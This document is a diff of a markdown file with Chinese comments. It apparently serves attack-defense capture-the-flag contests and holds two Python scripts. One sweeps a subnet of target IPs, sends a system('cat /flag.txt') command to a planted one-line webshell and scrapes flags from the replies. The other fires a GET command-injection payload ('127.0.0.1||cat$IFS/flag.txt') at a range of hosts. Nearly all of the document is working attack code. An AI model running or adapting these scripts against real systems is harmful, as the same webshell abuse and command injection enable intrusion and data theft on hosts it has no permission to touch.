@@ -3,33 +3,37 @@
 ```python
 import requests
 import re
-requests.adapters.DEFAULT_RETRIES = 1
 url="http://172.20."         #ip地址，如果是1.1.1.1,1.1.2.1请使用这个，然后根据网段自行修改自行修改
-urll=".102/shell.php"          #如果不是index.php请自行修改为一句话木马的地址
-payload={"shell":"system('cat /flag.txt');"}     #a为一句话木马，请自行修改
+urll=".1/shell.php"          #如果不是index.php请自行修改为一句话木马的地址
+payload={"shell":"system('cat /flag.txt');"}     #shell为一句话木马密码，请自行修改
 for i in range(101,109):                   #从192.168.1.1-192.168.10.1,请根据靶机ip自行修改
     print(url+str(i)+urll)
-    i=str(i)
-    cc=url+i
-    cc=cc+urll
-    a=requests.post(url=cc,data=payload).text
-    b=re.findall(r'\w{16,32}',a)    #正则表达式，表示查找数字和字母还有下划线，16位到32位的
+    i=str(i)        #将i转换成字符型，不然无法拼接
+    cc=url+i        #拼接
+    cc=cc+urll      #拼接
+    try:
+        a=requests.post(url=cc,data=payload,timeout=1).text
+        b=re.findall(r'[a-z0-9]{15,30}',a)      #正则匹配，表示匹配小写字母与数字组合长度为15-30位，根据flag位数自行修改，例如确定flag是20位那就直接r'[a-z0-9]{20}'
+    except:
+        b=''
     if len(b)>0:
         for j in b:
-            f=open('2.txt','a+')    #输出至2.txt,可以自行修改
-            f.write(url+i+".1 "+j+'\n')
-#切记，如果遇到有ip卡顿请手动修改for循环中的ip地址，例如到3卡顿，请手动修改跳过3，修改为(4-10)
+            f=open('1.txt','a+')    #输出至1.txt,可以自行修改
+            f.write(url+i+".1 "+j+'\n')     #靶机ip第四位.1,根据情况自行修改
 ```
 # 命令注入与文件包含通用脚本(根据漏洞自行修改)
 ```python
 import requests
 import re
 url="172.20.10."
-urll="/index.php?abc=127.0.0.1||cat$IFS/flag.txt"
+urll="/index.php?abc=127.0.0.1||cat$IFS/flag.txt"   #自行修改payload，本脚本展示get型命令注入与文件包含，看好题型如果是post自行修改
 for i in range(1,10):
     i=str(i)
-    a=requests.get(url=url+i+urll).text
-    b=re.findall(r'flag{.*}', a)
+    try:
+        a=requests.get(url=url+i+urll).text
+        b=re.findall(r'flag{.*}', a)
+    except:
+        b=''
     if(len(b)>0):
         for j in b:
             f=open('1.txt','a+')
